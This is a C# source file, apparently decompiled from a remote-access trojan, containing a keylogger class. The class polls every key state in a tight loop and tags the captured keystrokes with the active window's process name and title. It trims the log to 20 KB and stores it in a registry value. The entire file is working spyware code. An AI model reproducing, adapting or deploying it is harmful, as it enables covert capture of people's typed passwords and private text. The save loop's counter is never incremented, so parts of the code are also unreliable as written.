using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace w;

public class kl
{
	private string LastAS;
	private int LastAV;
	private Keys lastKey;

	public string Logs;
	public string vn;
	public kl()
	{
		lastKey = (Keys)0;
		Logs = "";
		vn = "[kl]";
	}

	private string AV()
	{
		try
		{
			IntPtr foregroundWindow = OK.GetForegroundWindow();
			int b = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref b);
			Process processById = Process.GetProcessById(b);
			if (!(((foregroundWindow.ToInt32() == LastAV) & (Operators.CompareString(LastAS, processById.MainWindowTitle, false) == 0)) | (processById.MainWindowTitle.Length == 0)))
			{
				LastAV = foregroundWindow.ToInt32();
				LastAS = processById.MainWindowTitle;
				return "\r\n\u0001" + DateAndTime.Now.ToString("yy/MM/dd ") + processById.ProcessName + " " + LastAS + "\u0001\r\n";
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception ex3 = ex2;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return "";
	}

	private string Fix(Keys k)
	{
		bool flag = OK.F.Keyboard.ShiftKeyDown;
		if (OK.F.Keyboard.CapsLock)
		{
			flag = !flag;
		}
		string result;
		string text;
		try
		{
			if ((int)k == 46 || (int)k == 8)
			{
				result = "[" + ((Enum)k).ToString() + "]";
				goto IL_0250;
			}
			if (((int)k == 160 || (int)k == 161 || (int)k == 65536 || (int)k == 16 || (int)k == 131072 || (int)k == 17 || (int)k == 163 || (int)k == 162 || (int)k == 262144 || (int)k == 112 || (int)k == 113 || (int)k == 114 || (int)k == 115 || (int)k == 116 || (int)k == 117 || (int)k == 118 || (int)k == 119 || (int)k == 120 || (int)k == 121 || (int)k == 122 || (int)k == 123 || (int)k == 35) ? true : false)
			{
				result = "";
				goto IL_0250;
			}
			if ((int)k == 32)
			{
				result = " ";
				goto IL_0250;
			}
			if ((int)k == 13 || (int)k == 13)
			{
				result = ((!Logs.EndsWith("[ENTER]\r\n")) ? "[ENTER]\r\n" : "");
				goto IL_0250;
			}
			if ((int)k == 9)
			{
				result = "[TAP]\r\n";
				goto IL_0250;
			}
			checked
			{
				if (flag)
				{
					result = VKCodeToUnicode((uint)k).ToUpper();
					goto IL_0250;
				}
				text = VKCodeToUnicode((uint)k);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception ex3 = ex2;
			if (flag)
			{
				text = Strings.ChrW((int)k).ToString().ToUpper();
				ProjectData.ClearProjectError();
				result = text;
				ProjectData.ClearProjectError();
				goto IL_0250;
			}
			text = Strings.ChrW((int)k).ToString().ToLower();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		result = text;
		goto IL_0250;
		IL_0250:
		return result;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int a);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int a);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] a);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint a, uint b);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint a, uint b, byte[] c, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder d, int e, uint f, IntPtr g);

	private static string VKCodeToUnicode(uint a)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array = new byte[255];
			if (!GetKeyboardState(array))
			{
				return "";
			}
			uint b = MapVirtualKey(a, 0u);
			int b2 = 0;
			IntPtr g = (IntPtr)GetKeyboardLayout(GetWindowThreadProcessId(OK.GetForegroundWindow(), ref b2));
			ToUnicodeEx(a, b, array, stringBuilder, 5, 0u, g);
			return stringBuilder.ToString();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception ex3 = ex2;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)checked((int)a)).ToString();
	}

	public void WRK()
	{
		Logs = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV(vn, "")));
		checked
		{
			try
			{
				while (true)
				{
					int num = 1;
					int num2 = 0;
					do
					{
						if ((GetAsyncKeyState(num2) == -32767) & !OK.F.Keyboard.CtrlKeyDown)
						{
							Keys k = (Keys)num2;
							string text = Fix(k);
							if (text.Length > 0)
							{
								Logs += AV();
								Logs += text;
							}
							lastKey = k;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = Conversions.ToInteger("20") * 1024;
						if (Logs.Length > num3)
						{
							Logs = Logs.Remove(0, Logs.Length - num3);
						}
						OK.STV(vn, Logs, RegistryValueKind.String);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}
}
